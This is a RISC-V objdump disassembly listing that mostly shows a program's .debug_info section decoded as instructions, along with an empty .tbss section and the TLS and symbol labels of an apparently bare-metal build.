000000008001b4a4 <sense.2895>:
    8001b4a4:	0000                	unimp
	...

Disassembly of section .tbss:

000000008001b4c0 <_tls_data>:
	...

Disassembly of section .debug_info:

0000000000000000 <.debug_info>:
       0:	0e49                	addi	t3,t3,18
       2:	0000                	unimp
       4:	0004                	0x4
       6:	0000                	unimp
       8:	0000                	unimp
       a:	0108                	addi	a0,sp,128
       c:	0170                	addi	a2,sp,140
       e:	0000                	unimp
      10:	000c                	0xc
      12:	0000                	unimp
      14:	4400                	lw	s0,8(s0)
      16:	0005                	c.nop	1
      18:	4800                	lw	s0,16(s0)
      1a:	0010                	0x10
      1c:	0080                	addi	s0,sp,64
      1e:	0000                	unimp
      20:	8800                	0x8800
      22:	0005                	c.nop	1
	...
      2c:	0200                	addi	s0,sp,256
      2e:	0601                	addi	a2,a2,0
      30:	03dd                	addi	t2,t2,23
      32:	0000                	unimp
      34:	00003503          	ld	a0,0(zero) # 0 <_tdata_begin>
      38:	0300                	addi	s0,sp,384
      3a:	0040182b          	0x40182b
      3e:	0000                	unimp
      40:	0102                	c.slli64	sp
      42:	db08                	sw	a0,48(a4)
      44:	02000003          	lb	zero,32(zero) # 20 <_tdata_begin+0x20>
      48:	0502                	c.slli64	a0
      4a:	0400                	addi	s0,sp,512
      4c:	0000                	unimp
      4e:	0202                	c.slli64	tp
      50:	0002a407          	flw	fs0,0(t0) # 2000 <_tbss_end+0x1f7c>
      54:	0400                	addi	s0,sp,512
      56:	0504                	addi	s1,sp,640
      58:	6e69                	lui	t3,0x1a
      5a:	0074                	addi	a3,sp,12
      5c:	0402                	c.slli64	s0
      5e:	00007d07          	0x7d07
      62:	0300                	addi	s0,sp,384
      64:	0098                	addi	a4,sp,64
      66:	0000                	unimp
      68:	6f186703          	lwu	a4,1777(a6)
      6c:	0000                	unimp
      6e:	0200                	addi	s0,sp,256
      70:	0508                	addi	a0,sp,640
      72:	000000f3          	0xf3
      76:	0003a003          	lw	zero,0(t2)
      7a:	0300                	addi	s0,sp,384
      7c:	1969                	addi	s2,s2,-6
      7e:	0082                	c.slli64	ra
      80:	0000                	unimp
      82:	0802                	c.slli64	a6
      84:	00007807          	0x7807
      88:	0200                	addi	s0,sp,256
      8a:	0508                	addi	a0,sp,640
      8c:	00ee                	slli	ra,ra,0x1b
      8e:	0000                	unimp
      90:	1002                	c.slli	zero,0x20
      92:	4504                	lw	s1,8(a0)
      94:	05000003          	lb	zero,80(zero) # 50 <buf.2990+0x10>
      98:	02f2                	slli	t0,t0,0x1c
      9a:	0000                	unimp
      9c:	5e04                	lw	s1,56(a2)
      9e:	1701                	addi	a4,a4,-32
      a0:	005c                	addi	a5,sp,4
      a2:	0000                	unimp
      a4:	00038b03          	lb	s6,0(t2)
      a8:	0500                	addi	s0,sp,640
      aa:	0e2e                	slli	t3,t3,0xb
      ac:	0000006f          	j	ac <_tbss_end+0x28>
      b0:	0004bc03          	ld	s8,0(s1)
      b4:	0500                	addi	s0,sp,640
      b6:	0e74                	addi	a3,sp,796
      b8:	0000006f          	j	b8 <_tbss_end+0x34>
      bc:	00058703          	lb	a4,0(a1)
      c0:	0500                	addi	s0,sp,640
      c2:	006f1793          	slli	a5,t5,0x6
      c6:	0000                	unimp
      c8:	0406                	slli	s0,s0,0x1
      ca:	a505                	j	6ea <_tbss_end+0x666>
      cc:	0000ea03          	lwu	s4,0(ra)
      d0:	0700                	addi	s0,sp,896
      d2:	02ec                	addi	a1,sp,332
      d4:	0000                	unimp
      d6:	a705                	j	7f6 <_tbss_end+0x772>
      d8:	970c                	0x970c
      da:	0000                	unimp
      dc:	0700                	addi	s0,sp,896
      de:	0272                	slli	tp,tp,0x1c
      e0:	0000                	unimp
      e2:	a805                	j	112 <_tbss_end+0x8e>
      e4:	0000ea13          	ori	s4,ra,0
      e8:	0000                	unimp
      ea:	4008                	lw	a0,0(s0)
      ec:	0000                	unimp
      ee:	fa00                	sd	s0,48(a2)
      f0:	0000                	unimp
      f2:	0900                	addi	s0,sp,144
      f4:	0082                	c.slli64	ra
      f6:	0000                	unimp
      f8:	080a0003          	lb	zero,128(s4)
      fc:	a205                	j	21c <_tbss_end+0x198>
      fe:	1e09                	addi	t3,t3,-30
     100:	0001                	nop
     102:	0b00                	addi	s0,sp,400
     104:	04a6                	slli	s1,s1,0x9
     106:	0000                	unimp
     108:	a405                	j	328 <_tbss_end+0x2a4>
     10a:	00005507          	0x5507
     10e:	0000                	unimp
     110:	0004ae0b          	0x4ae0b
     114:	0500                	addi	s0,sp,640
     116:	05a9                	addi	a1,a1,10
     118:	00c8                	addi	a0,sp,68
     11a:	0000                	unimp
     11c:	0004                	0x4
     11e:	00042803          	lw	a6,0(s0) # ffffffffffff9000 <_end+0xffffffff7ffddb40>
     122:	0500                	addi	s0,sp,640
     124:	03aa                	slli	t2,t2,0xa
     126:	00fa                	slli	ra,ra,0x1e
     128:	0000                	unimp
     12a:	080c                	addi	a1,sp,16
     12c:	00050403          	lb	s0,0(a0)
     130:	0600                	addi	s0,sp,768
     132:	1919                	addi	s2,s2,-26
     134:	005c                	addi	a5,sp,4
     136:	0000                	unimp
     138:	0003bc03          	ld	s8,0(t2)
     13c:	0700                	addi	s0,sp,896
     13e:	0d0c                	addi	a1,sp,656
     140:	0055                	c.nop	21
     142:	0000                	unimp
     144:	00022903          	lw	s2,0(tp) # ffffffffffff8000 <_end+0xffffffff7ffdcb40>
     148:	0600                	addi	s0,sp,768
     14a:	01381b23          	sh	s3,22(a6)
     14e:	0000                	unimp
     150:	3a0d                	addiw	s4,s4,-29
     152:	0002                	c.slli64	zero
     154:	2000                	fld	fs0,0(s0)
     156:	3406                	fld	fs0,96(sp)
     158:	aa08                	fsd	fa0,16(a2)
     15a:	0001                	nop
     15c:	0b00                	addi	s0,sp,400
     15e:	0449                	addi	s0,s0,18
     160:	0000                	unimp
     162:	3606                	fld	fa2,96(sp)
     164:	0001aa13          	slti	s4,gp,0
     168:	0000                	unimp
     16a:	5f0e                	lw	t5,224(sp)
     16c:	3706006b          	0x3706006b
     170:	00005507          	0x5507
     174:	0800                	addi	s0,sp,16
     176:	0004910b          	0x4910b
     17a:	0600                	addi	s0,sp,768
     17c:	00550b37          	lui	s6,0x550
     180:	0000                	unimp
     182:	0b0c                	addi	a1,sp,400
     184:	021d                	addi	tp,tp,7
     186:	0000                	unimp
     188:	3706                	fld	fa4,96(sp)
     18a:	5514                	lw	a3,40(a0)
     18c:	0000                	unimp
     18e:	1000                	addi	s0,sp,32
     190:	0005720b          	0x5720b
     194:	0600                	addi	s0,sp,768
     196:	00551b37          	lui	s6,0x551
     19a:	0000                	unimp
     19c:	0e14                	addi	a3,sp,784
     19e:	785f 0600 0b38      	0xb380600785f
     1a4:	01b0                	addi	a2,sp,200
     1a6:	0000                	unimp
     1a8:	0018                	0x18
     1aa:	0150080f          	0x150080f
     1ae:	0000                	unimp
     1b0:	2c08                	fld	fa0,24(s0)
     1b2:	0001                	nop
     1b4:	c000                	sw	s0,0(s0)
     1b6:	0001                	nop
     1b8:	0900                	addi	s0,sp,144
     1ba:	0082                	c.slli64	ra
     1bc:	0000                	unimp
     1be:	0000                	unimp
     1c0:	610d                	addi	sp,sp,160
     1c2:	0002                	c.slli64	zero
     1c4:	2400                	fld	fs0,8(s0)
     1c6:	3c06                	fld	fs8,96(sp)
     1c8:	4308                	lw	a0,0(a4)
     1ca:	0002                	c.slli64	zero
     1cc:	0b00                	addi	s0,sp,400
     1ce:	000000db          	0xdb
     1d2:	3e06                	fld	ft8,96(sp)
     1d4:	5509                	li	a0,-30
     1d6:	0000                	unimp
     1d8:	0000                	unimp
     1da:	0004c40b          	0x4c40b
     1de:	0600                	addi	s0,sp,768
     1e0:	0055093f 0b040000 	0xb0400000055093f
     1e8:	010e                	slli	sp,sp,0x3
     1ea:	0000                	unimp
     1ec:	4006                	0x4006
     1ee:	5509                	li	a0,-30
     1f0:	0000                	unimp
     1f2:	0800                	addi	s0,sp,16
     1f4:	0006080b          	0x6080b
     1f8:	0600                	addi	s0,sp,768
     1fa:	0941                	addi	s2,s2,16
     1fc:	0055                	c.nop	21
     1fe:	0000                	unimp
     200:	0b0c                	addi	a1,sp,400
     202:	0365                	addi	t1,t1,25
     204:	0000                	unimp
     206:	4206                	lw	tp,64(sp)
     208:	5509                	li	a0,-30
     20a:	0000                	unimp
     20c:	1000                	addi	s0,sp,32
     20e:	0003190b          	0x3190b
     212:	0600                	addi	s0,sp,768
     214:	00550943          	fmadd.s	fs2,fa0,ft5,ft0,rne
     218:	0000                	unimp
     21a:	0b14                	addi	a3,sp,400
     21c:	00000577          	0x577
     220:	4406                	lw	s0,64(sp)
     222:	5509                	li	a0,-30
     224:	0000                	unimp
     226:	1800                	addi	s0,sp,48
     228:	00040a0b          	0x40a0b
     22c:	0600                	addi	s0,sp,768
     22e:	0945                	addi	s2,s2,17
     230:	0055                	c.nop	21
     232:	0000                	unimp
     234:	0b1c                	addi	a5,sp,400
     236:	05b2                	slli	a1,a1,0xc
     238:	0000                	unimp
     23a:	4606                	lw	a2,64(sp)
     23c:	5509                	li	a0,-30
     23e:	0000                	unimp
     240:	2000                	fld	fs0,0(s0)
     242:	1000                	addi	s0,sp,32
     244:	011d                	addi	sp,sp,7
     246:	0000                	unimp
     248:	0208                	addi	a0,sp,256
     24a:	4f06                	lw	t5,64(sp)
     24c:	8908                	0x8908
     24e:	0002                	c.slli64	zero
     250:	0b00                	addi	s0,sp,400
     252:	0210                	addi	a2,sp,256
     254:	0000                	unimp
     256:	5006                	0x5006
     258:	890a                	mv	s2,sp
     25a:	0002                	c.slli64	zero
     25c:	0000                	unimp
     25e:	9111                	srli	a0,a0,0x24
     260:	0002                	c.slli64	zero
     262:	0600                	addi	s0,sp,768
     264:	0951                	addi	s2,s2,20
     266:	0289                	addi	t0,t0,2
     268:	0000                	unimp
     26a:	0100                	addi	s0,sp,128
     26c:	f611                	bnez	a2,178 <_tbss_end+0xf4>
     26e:	0004                	0x4
     270:	0600                	addi	s0,sp,768
     272:	012c0a53          	fadd.s	fs4,fs8,fs2,rne
     276:	0000                	unimp
     278:	0200                	addi	s0,sp,256
     27a:	4c11                	li	s8,4
     27c:	0001                	nop
     27e:	0600                	addi	s0,sp,768
     280:	0a56                	slli	s4,s4,0x15
     282:	012c                	addi	a1,sp,136
     284:	0000                	unimp
     286:	0204                	addi	s1,sp,256
     288:	0800                	addi	s0,sp,16
     28a:	012a                	slli	sp,sp,0xa
     28c:	0000                	unimp
     28e:	0299                	addi	t0,t0,6
     290:	0000                	unimp
     292:	8209                	srli	a2,a2,0x2
     294:	0000                	unimp
     296:	1f00                	addi	s0,sp,944
     298:	1000                	addi	s0,sp,32
     29a:	036e                	slli	t1,t1,0x1b
     29c:	0000                	unimp
     29e:	0318                	addi	a4,sp,384
     2a0:	6206                	ld	tp,64(sp)
     2a2:	dd08                	sw	a0,56(a0)
     2a4:	0002                	c.slli64	zero
     2a6:	0b00                	addi	s0,sp,400
     2a8:	0449                	addi	s0,s0,18
     2aa:	0000                	unimp
     2ac:	6306                	ld	t1,64(sp)
     2ae:	dd12                	sw	tp,184(sp)
     2b0:	0002                	c.slli64	zero
     2b2:	0000                	unimp
     2b4:	0004610b          	0x4610b
     2b8:	0600                	addi	s0,sp,768
     2ba:	0664                	addi	s1,sp,780
     2bc:	0055                	c.nop	21
     2be:	0000                	unimp
     2c0:	0b08                	addi	a0,sp,400
     2c2:	0218                	addi	a4,sp,256
     2c4:	0000                	unimp
     2c6:	6606                	ld	a2,64(sp)
     2c8:	e309                	bnez	a4,2ca <_tbss_end+0x246>
     2ca:	0002                	c.slli64	zero
     2cc:	1000                	addi	s0,sp,32
     2ce:	1d11                	addi	s10,s10,-28
     2d0:	0001                	nop
     2d2:	0600                	addi	s0,sp,768
     2d4:	02431e67          	0x2431e67
     2d8:	0000                	unimp
     2da:	0110                	addi	a2,sp,128
     2dc:	0f00                	addi	s0,sp,912
     2de:	9908                	0x9908
     2e0:	0002                	c.slli64	zero
     2e2:	0800                	addi	s0,sp,16
     2e4:	000002f3          	0x2f3
     2e8:	000002f3          	0x2f3
     2ec:	8209                	srli	a2,a2,0x2
     2ee:	0000                	unimp
     2f0:	1f00                	addi	s0,sp,944
     2f2:	0f00                	addi	s0,sp,912
     2f4:	f908                	sd	a0,48(a0)
     2f6:	0002                	c.slli64	zero
     2f8:	1200                	addi	s0,sp,288
     2fa:	140d                	addi	s0,s0,-29
     2fc:	0004                	0x4
     2fe:	1000                	addi	s0,sp,32
     300:	7a06                	ld	s4,96(sp)
     302:	2208                	fld	fa0,0(a2)
     304:	0b000003          	lb	zero,176(zero) # b0 <_tbss_end+0x2c>
     308:	0102                	c.slli64	sp
     30a:	0000                	unimp
     30c:	7b06                	ld	s6,96(sp)
     30e:	2211                	addiw	tp,tp,4
     310:	00000003          	lb	zero,0(zero) # 0 <_tdata_begin>
     314:	00067a0b          	0x67a0b
     318:	0600                	addi	s0,sp,768
     31a:	067c                	addi	a5,sp,780
     31c:	0055                	c.nop	21
     31e:	0000                	unimp
     320:	0008                	0x8
     322:	0040080f          	0x40080f
     326:	0000                	unimp
     328:	330d                	addiw	t1,t1,-29
     32a:	0004                	0x4
     32c:	b000                	fsd	fs0,32(s0)
     32e:	ba06                	fsd	ft1,304(sp)
     330:	6b08                	ld	a0,16(a4)
     332:	0004                	0x4
     334:	0e00                	addi	s0,sp,784
     336:	705f 0600 12bb      	0x12bb0600705f
     33c:	0322                	slli	t1,t1,0x8
     33e:	0000                	unimp
     340:	0e00                	addi	s0,sp,784
     342:	725f 0600 07bc      	0x7bc0600725f
     348:	0055                	c.nop	21
     34a:	0000                	unimp
     34c:	0e08                	addi	a0,sp,784
     34e:	775f 0600 07bd      	0x7bd0600775f
     354:	0055                	c.nop	21
     356:	0000                	unimp
     358:	0b0c                	addi	a1,sp,400
     35a:	0145                	addi	sp,sp,17
     35c:	0000                	unimp
     35e:	be06                	fsd	ft1,312(sp)
     360:	4709                	li	a4,2
     362:	0000                	unimp
     364:	1000                	addi	s0,sp,32
     366:	00056c0b          	0x56c0b
     36a:	0600                	addi	s0,sp,768
     36c:	004709bf 0e120000 	0xe120000004709bf
     374:	625f 0066 c006      	0xc0060066625f
     37a:	fa11                	bnez	a2,28e <_tbss_end+0x20a>
     37c:	0002                	c.slli64	zero
     37e:	1800                	addi	s0,sp,48
     380:	00008a0b          	0x8a0b
     384:	0600                	addi	s0,sp,768
     386:	07c1                	addi	a5,a5,16
     388:	0055                	c.nop	21
     38a:	0000                	unimp
     38c:	0b28                	addi	a0,sp,408
     38e:	0135                	addi	sp,sp,13
     390:	0000                	unimp
     392:	c806                	sw	ra,16(sp)
     394:	2a0a                	fld	fs4,128(sp)
     396:	0001                	nop
     398:	3000                	fld	fs0,32(s0)
     39a:	0002510b          	0x2510b
     39e:	0600                	addi	s0,sp,768
     3a0:	1dca                	slli	s11,s11,0x32
     3a2:	000005ef          	jal	a1,3a2 <_tbss_end+0x31e>
     3a6:	0b38                	addi	a4,sp,408
     3a8:	0312                	slli	t1,t1,0x4
     3aa:	0000                	unimp
     3ac:	cc06                	sw	ra,24(sp)
     3ae:	191d                	addi	s2,s2,-25
     3b0:	0006                	c.slli	zero,0x1
     3b2:	4000                	lw	s0,0(s0)
     3b4:	0004b60b          	0x4b60b
     3b8:	0600                	addi	s0,sp,768
     3ba:	063d0dcf          	fnmadd.q	fs11,fs10,ft3,ft0,rne
     3be:	0000                	unimp
     3c0:	0b48                	addi	a0,sp,404
     3c2:	05cc                	addi	a1,sp,708
     3c4:	0000                	unimp
     3c6:	d006                	sw	ra,32(sp)
     3c8:	5709                	li	a4,-30
     3ca:	0006                	c.slli	zero,0x1
     3cc:	5000                	lw	s0,32(s0)
     3ce:	5f0e                	lw	t5,224(sp)
     3d0:	6275                	lui	tp,0x1d
     3d2:	0600                	addi	s0,sp,768
     3d4:	02fa11d3          	fadd.d	ft3,fs4,fa5,rtz
     3d8:	0000                	unimp
     3da:	0e58                	addi	a4,sp,788
     3dc:	755f 0070 d406      	0xd4060070755f
     3e2:	2212                	fld	ft4,256(sp)
     3e4:	68000003          	lb	zero,1664(zero) # 680 <_tbss_end+0x5fc>
     3e8:	5f0e                	lw	t5,224(sp)
     3ea:	7275                	lui	tp,0xffffd
     3ec:	0600                	addi	s0,sp,768
     3ee:	07d5                	addi	a5,a5,21
     3f0:	0055                	c.nop	21
     3f2:	0000                	unimp
     3f4:	0b70                	addi	a2,sp,412
     3f6:	00fc                	addi	a5,sp,76
     3f8:	0000                	unimp
     3fa:	d806                	sw	ra,48(sp)
     3fc:	5d11                	li	s10,-28
     3fe:	0006                	c.slli	zero,0x1
     400:	7400                	ld	s0,40(s0)
     402:	0005a40b          	0x5a40b
     406:	0600                	addi	s0,sp,768
     408:	11d9                	addi	gp,gp,-10
     40a:	066d                	addi	a2,a2,27
     40c:	0000                	unimp
     40e:	6c5f0e77          	0x6c5f0e77
     412:	0062                	c.slli	zero,0x18
     414:	dc06                	sw	ra,56(sp)
     416:	fa11                	bnez	a2,32a <_tbss_end+0x2a6>
     418:	0002                	c.slli64	zero
     41a:	7800                	ld	s0,48(s0)
     41c:	0001670b          	0x1670b
     420:	0600                	addi	s0,sp,768
     422:	07df 0055 0000      	0x5507df
     428:	0b88                	addi	a0,sp,464
     42a:	01e9                	addi	gp,gp,26
     42c:	0000                	unimp
     42e:	e006                	sd	ra,0(sp)
     430:	a40a                	fsd	ft2,8(sp)
     432:	0000                	unimp
     434:	9000                	0x9000
     436:	00063d0b          	0x63d0b
     43a:	0600                	addi	s0,sp,768
     43c:	048912e3          	bne	s2,s0,c80 <_tbss_end+0xbfc>
     440:	0000                	unimp
     442:	0b98                	addi	a4,sp,464
     444:	02f9                	addi	t0,t0,30
     446:	0000                	unimp
     448:	e706                	sd	ra,392(sp)
     44a:	440c                	lw	a1,8(s0)
     44c:	0001                	nop
     44e:	a000                	fsd	fs0,0(s0)
     450:	00043b0b          	0x43b0b
     454:	0600                	addi	s0,sp,768
     456:	0ee9                	addi	t4,t4,26
     458:	011e                	slli	sp,sp,0x7
     45a:	0000                	unimp
     45c:	0ba4                	addi	s1,sp,472
     45e:	02ff                	0x2ff
     460:	0000                	unimp
     462:	ea06                	sd	ra,272(sp)
     464:	5509                	li	a0,-30
     466:	0000                	unimp
     468:	ac00                	fsd	fs0,24(s0)
     46a:	1300                	addi	s0,sp,416
     46c:	00bc                	addi	a5,sp,72
     46e:	0000                	unimp
     470:	0489                	addi	s1,s1,2
     472:	0000                	unimp
     474:	8914                	0x8914
     476:	0004                	0x4
     478:	1400                	addi	s0,sp,544
     47a:	012a                	slli	sp,sp,0xa
     47c:	0000                	unimp
     47e:	dd14                	sw	a3,56(a0)
     480:	0005                	c.nop	1
     482:	1400                	addi	s0,sp,544
     484:	0055                	c.nop	21
     486:	0000                	unimp
     488:	0f00                	addi	s0,sp,912
     48a:	9408                	0x9408
     48c:	0004                	0x4
     48e:	1500                	addi	s0,sp,672
     490:	0489                	addi	s1,s1,2
     492:	0000                	unimp
     494:	9916                	add	s2,s2,t0
     496:	0004                	0x4
     498:	4800                	lw	s0,16(s0)
     49a:	02650607          	0x2650607
     49e:	dd08                	sw	a0,56(a0)
     4a0:	0005                	c.nop	1
     4a2:	1700                	addi	s0,sp,928
     4a4:	03f9                	addi	t2,t2,30
     4a6:	0000                	unimp
     4a8:	6706                	ld	a4,64(sp)
     4aa:	0702                	c.slli64	a4
     4ac:	0055                	c.nop	21
     4ae:	0000                	unimp
     4b0:	1700                	addi	s0,sp,928
     4b2:	0154                	addi	a3,sp,132
     4b4:	0000                	unimp
     4b6:	6c06                	ld	s8,64(sp)
     4b8:	0b02                	c.slli64	s6
     4ba:	06c9                	addi	a3,a3,18
     4bc:	0000                	unimp
     4be:	1708                	addi	a0,sp,928
     4c0:	0279                	addi	tp,tp,30
     4c2:	0000                	unimp
     4c4:	6c06                	ld	s8,64(sp)
     4c6:	1402                	slli	s0,s0,0x20
     4c8:	06c9                	addi	a3,a3,18
     4ca:	0000                	unimp
     4cc:	1710                	addi	a2,sp,928
     4ce:	0232                	slli	tp,tp,0xc
     4d0:	0000                	unimp
     4d2:	6c06                	ld	s8,64(sp)
     4d4:	1e02                	slli	t3,t3,0x20
     4d6:	06c9                	addi	a3,a3,18
     4d8:	0000                	unimp
     4da:	1718                	addi	a4,sp,928
     4dc:	045c                	addi	a5,sp,516
     4de:	0000                	unimp
     4e0:	6e06                	ld	t3,64(sp)
     4e2:	0802                	c.slli64	a6
     4e4:	0055                	c.nop	21
     4e6:	0000                	unimp
     4e8:	1720                	addi	s0,sp,936
     4ea:	002a                	c.slli	zero,0xa
     4ec:	0000                	unimp
     4ee:	6f06                	ld	t5,64(sp)
     4f0:	0802                	c.slli64	a6
     4f2:	08d2                	slli	a7,a7,0x14
     4f4:	0000                	unimp
     4f6:	1724                	addi	s1,sp,936
     4f8:	0478                	addi	a4,sp,524
     4fa:	0000                	unimp
     4fc:	7206                	ld	tp,96(sp)
     4fe:	0702                	c.slli64	a4
     500:	0055                	c.nop	21
     502:	0000                	unimp
     504:	1740                	addi	s0,sp,932
     506:	0466                	slli	s0,s0,0x19
     508:	0000                	unimp
     50a:	7306                	ld	t1,96(sp)
     50c:	1602                	slli	a2,a2,0x20
     50e:	000008e7          	jalr	a7,zero # 0 <_tdata_begin>
     512:	1748                	addi	a0,sp,932
     514:	0380                	addi	s0,sp,448
     516:	0000                	unimp
     518:	7506                	ld	a0,96(sp)
     51a:	0702                	c.slli64	a4
     51c:	0055                	c.nop	21
     51e:	0000                	unimp
     520:	1750                	addi	a2,sp,932
     522:	046e                	slli	s0,s0,0x1b
     524:	0000                	unimp
     526:	7706                	ld	a4,96(sp)
     528:	0a02                	c.slli64	s4
     52a:	08f8                	addi	a4,sp,92
     52c:	0000                	unimp
     52e:	1758                	addi	a4,sp,932
     530:	02e4                	addi	s1,sp,332
     532:	0000                	unimp
     534:	7a06                	ld	s4,96(sp)
     536:	1302                	slli	t1,t1,0x20
     538:	01aa                	slli	gp,gp,0xa
     53a:	0000                	unimp
     53c:	1760                	addi	s0,sp,940
     53e:	00000257          	0x257
     542:	7b06                	ld	s6,96(sp)
     544:	0702                	c.slli64	a4
     546:	0055                	c.nop	21
     548:	0000                	unimp
     54a:	1768                	addi	a0,sp,940
     54c:	05f4                	addi	a3,sp,716
     54e:	0000                	unimp
     550:	7c06                	ld	s8,96(sp)
     552:	1302                	slli	t1,t1,0x20
     554:	01aa                	slli	gp,gp,0xa
     556:	0000                	unimp
     558:	1770                	addi	a2,sp,940
     55a:	03b2                	slli	t2,t2,0xc
     55c:	0000                	unimp
     55e:	7d06                	ld	s10,96(sp)
     560:	1402                	slli	s0,s0,0x20
     562:	08fe                	slli	a7,a7,0x1f
     564:	0000                	unimp
     566:	1778                	addi	a4,sp,940
     568:	0281                	addi	t0,t0,0
     56a:	0000                	unimp
     56c:	8006                	c.mv	zero,ra
     56e:	0702                	c.slli64	a4
     570:	0055                	c.nop	21
     572:	0000                	unimp
     574:	1780                	addi	s0,sp,992
     576:	01e1                	addi	gp,gp,24
     578:	0000                	unimp
     57a:	8106                	mv	sp,ra
     57c:	0902                	c.slli64	s2
     57e:	05dd                	addi	a1,a1,23
     580:	0000                	unimp
     582:	1788                	addi	a0,sp,992
     584:	03f2                	slli	t2,t2,0x1c
     586:	0000                	unimp
     588:	a406                	fsd	ft1,8(sp)
     58a:	0702                	c.slli64	a4
     58c:	08ac                	addi	a1,sp,88
     58e:	0000                	unimp
     590:	1890                	addi	a2,sp,112
     592:	036e                	slli	t1,t1,0x1b
     594:	0000                	unimp
     596:	a806                	fsd	ft1,16(sp)
     598:	1302                	slli	t1,t1,0x20
     59a:	02dd                	addi	t0,t0,23
     59c:	0000                	unimp
     59e:	01f8                	addi	a4,sp,204
     5a0:	b718                	fsd	fa4,40(a4)
     5a2:	0002                	c.slli64	zero
     5a4:	0600                	addi	s0,sp,768
     5a6:	02a9                	addi	t0,t0,10
     5a8:	9912                	add	s2,s2,tp
     5aa:	0002                	c.slli64	zero
     5ac:	0000                	unimp
     5ae:	1802                	slli	a6,a6,0x20
     5b0:	059a                	slli	a1,a1,0x6
     5b2:	0000                	unimp
     5b4:	ad06                	fsd	ft1,152(sp)
     5b6:	0c02                	c.slli64	s8
     5b8:	0000090f          	0x90f
     5bc:	0518                	addi	a4,sp,640
     5be:	3d18                	fld	fa4,56(a0)
     5c0:	0001                	nop
     5c2:	0600                	addi	s0,sp,768
     5c4:	02b2                	slli	t0,t0,0xc
     5c6:	8a10                	0x8a10
     5c8:	0006                	c.slli	zero,0x1
     5ca:	2000                	fld	fs0,0(s0)
     5cc:	1805                	addi	a6,a6,-31
     5ce:	0118                	addi	a4,sp,128
     5d0:	0000                	unimp
     5d2:	b406                	fsd	ft1,40(sp)
     5d4:	0a02                	c.slli64	s4
     5d6:	0000091b          	sext.w	s2,zero
     5da:	0538                	addi	a4,sp,648
     5dc:	0f00                	addi	s0,sp,912
     5de:	e308                	sd	a0,0(a4)
     5e0:	0005                	c.nop	1
     5e2:	0200                	addi	s0,sp,256
     5e4:	0801                	addi	a6,a6,0
     5e6:	03e4                	addi	s1,sp,460
     5e8:	0000                	unimp
     5ea:	e315                	bnez	a4,60e <_tbss_end+0x58a>
     5ec:	0005                	c.nop	1
     5ee:	0f00                	addi	s0,sp,912
     5f0:	6b08                	ld	a0,16(a4)
     5f2:	0004                	0x4
     5f4:	1300                	addi	s0,sp,416
     5f6:	00bc                	addi	a5,sp,72
     5f8:	0000                	unimp
     5fa:	00000613          	li	a2,0
     5fe:	8914                	0x8914
     600:	0004                	0x4
     602:	1400                	addi	s0,sp,544
     604:	012a                	slli	sp,sp,0xa
     606:	0000                	unimp
     608:	1314                	addi	a3,sp,416
     60a:	0006                	c.slli	zero,0x1
     60c:	1400                	addi	s0,sp,544
     60e:	0055                	c.nop	21
     610:	0000                	unimp
     612:	0f00                	addi	s0,sp,912
     614:	ea08                	sd	a0,16(a2)
     616:	0005                	c.nop	1
     618:	0f00                	addi	s0,sp,912
     61a:	f508                	sd	a0,40(a0)
     61c:	0005                	c.nop	1
     61e:	1300                	addi	s0,sp,416
     620:	00b0                	addi	a2,sp,72
     622:	0000                	unimp
     624:	063d                	addi	a2,a2,15
     626:	0000                	unimp
     628:	8914                	0x8914
     62a:	0004                	0x4
     62c:	1400                	addi	s0,sp,544
     62e:	012a                	slli	sp,sp,0xa
     630:	0000                	unimp
     632:	b014                	fsd	fa3,32(s0)
     634:	0000                	unimp
     636:	1400                	addi	s0,sp,544
     638:	0055                	c.nop	21
     63a:	0000                	unimp
     63c:	0f00                	addi	s0,sp,912
     63e:	1f08                	addi	a0,sp,944
     640:	0006                	c.slli	zero,0x1
     642:	1300                	addi	s0,sp,416
     644:	0055                	c.nop	21
     646:	0000                	unimp
     648:	00000657          	0x657
     64c:	8914                	0x8914
     64e:	0004                	0x4
     650:	1400                	addi	s0,sp,544
     652:	012a                	slli	sp,sp,0xa
     654:	0000                	unimp
     656:	0f00                	addi	s0,sp,912
     658:	4308                	lw	a0,0(a4)
     65a:	0006                	c.slli	zero,0x1
     65c:	0800                	addi	s0,sp,16
     65e:	0040                	addi	s0,sp,4
     660:	0000                	unimp
     662:	066d                	addi	a2,a2,27
     664:	0000                	unimp
     666:	8209                	srli	a2,a2,0x2
     668:	0000                	unimp
     66a:	0200                	addi	s0,sp,256
     66c:	0800                	addi	s0,sp,16
     66e:	0040                	addi	s0,sp,4
     670:	0000                	unimp
     672:	067d                	addi	a2,a2,31
     674:	0000                	unimp
     676:	8209                	srli	a2,a2,0x2
     678:	0000                	unimp
     67a:	0000                	unimp
     67c:	0500                	addi	s0,sp,640
     67e:	0421                	addi	s0,s0,8
     680:	0000                	unimp
     682:	2406                	fld	fs0,64(sp)
     684:	1a01                	addi	s4,s4,-32
     686:	0328                	addi	a0,sp,392
     688:	0000                	unimp
     68a:	8119                	srli	a0,a0,0x6
     68c:	0005                	c.nop	1
     68e:	1800                	addi	s0,sp,48
     690:	2806                	fld	fa6,64(sp)
     692:	0801                	addi	a6,a6,0
     694:	000006c3          	fmadd.s	fa3,ft0,ft0,ft0,rne
     698:	00044917          	auipc	s2,0x44
     69c:	0600                	addi	s0,sp,768
     69e:	012a                	slli	sp,sp,0xa
     6a0:	c311                	beqz	a4,6a4 <_tbss_end+0x620>
     6a2:	0006                	c.slli	zero,0x1
     6a4:	0000                	unimp
     6a6:	00029d17          	auipc	s10,0x29
     6aa:	0600                	addi	s0,sp,768
     6ac:	5507012b          	0x5507012b
     6b0:	0000                	unimp
     6b2:	0800                	addi	s0,sp,16
     6b4:	00041b17          	auipc	s6,0x41
     6b8:	0600                	addi	s0,sp,768
     6ba:	012c                	addi	a1,sp,136
     6bc:	0006c90b          	0x6c90b
     6c0:	1000                	addi	s0,sp,32
     6c2:	0f00                	addi	s0,sp,912
     6c4:	8a08                	0x8a08
     6c6:	0006                	c.slli	zero,0x1
     6c8:	0f00                	addi	s0,sp,912
     6ca:	7d08                	ld	a0,56(a0)
     6cc:	0006                	c.slli	zero,0x1
     6ce:	1900                	addi	s0,sp,176
     6d0:	0022                	c.slli	zero,0x8
     6d2:	0000                	unimp
     6d4:	060e                	slli	a2,a2,0x3
     6d6:	0144                	addi	s1,sp,132
     6d8:	0808                	addi	a0,sp,16
     6da:	17000007          	0x17000007
     6de:	04a0                	addi	s0,sp,584
     6e0:	0000                	unimp
     6e2:	4506                	lw	a0,64(sp)
     6e4:	1201                	addi	tp,tp,-32
     6e6:	0708                	addi	a0,sp,896
     6e8:	0000                	unimp
     6ea:	1700                	addi	s0,sp,928
     6ec:	04de                	slli	s1,s1,0x17
     6ee:	0000                	unimp
